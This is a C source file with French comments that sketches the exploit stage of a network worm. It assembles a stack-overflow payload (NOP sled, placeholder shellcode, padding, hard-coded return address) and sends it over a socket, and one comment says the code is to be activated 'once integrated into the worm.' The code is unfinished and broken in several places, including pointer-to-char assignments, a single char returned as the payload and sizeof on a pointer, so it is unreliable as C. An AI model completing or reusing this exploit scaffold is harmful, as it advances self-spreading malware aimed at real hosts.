#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h> // inet_addr()
#include <sys/socket.h>
#include <unistd.h> 
#define MAX 80

// Voir fonction strcat pour concaténer des chars (string.h)

char crafted_payload(){

	// Serie de NOP
	int nb_nop = 40;
	char nops[nb_nop];
	char un_nop[] = "\x90";
	for (int i = 0; i < nb_nop; i++){
		nops[i] = un_nop;
	}
	printf("%s\n", nops);

	// Shellcode en dur
	char shellcode[] = "\x48\x45\x4c\x4c\x43\x4f\x44\x45";
	printf("%s\n", shellcode);

	// Padding de bp
	char padding_bp [] = "\x41\x41\x41\x41";
	printf("%s\n", padding_bp);

	// Adresse de retour en dur
	char retour[] = "\x41\x44\x44\x52\x5f\x52\x45\x54";
	printf("%s\n", retour);

	strcat(nops, shellcode);
	strcat(padding_bp, retour);
	strcat(nops, padding_bp);
	//printf("%s\n", nops);

	return *nops;
}

int func(int sockfd, char *pay)
{
	printf("Overflow en cours...");
	int verif = write(sockfd, pay, sizeof(pay));
	if (verif == -1){
		printf("Error : Payload sending failed\n");
	}
	else {
		printf("Payload successfully send !\n");
	}
	return verif;
}

/*unsigned long get_sp(void) {
__asm__("movq %rsp,%rax");
}
long l=get_sp();
printf("Ox%lu\n", l);
*/

int main (int argc, char *argv[]){

	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 


	char payload[] = crafted_payload();
	char (*my_func)() = crafted_payload;
	//char payload = (*my_func)();
	
    // Ecriture en dur du shellcode : 
    // NOP *40(etc 1 octet chaque)
	// + shellcode (taille à définir POUR TAILLE BOF) 
    // + "A" *4(1 octet chaque)
	// + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
    //char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x45\x4c\x4c\x43\x4f\x44\x45\x41\x41\x41\x41\x40"; // A COMPLETER

    // COMMENT @retour = @base pile + taille instruction ENTIERE

    // Envoi de la payload
	//int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS

    printf("%s\n", payload);
	printf("OK\n");
    return 0;
}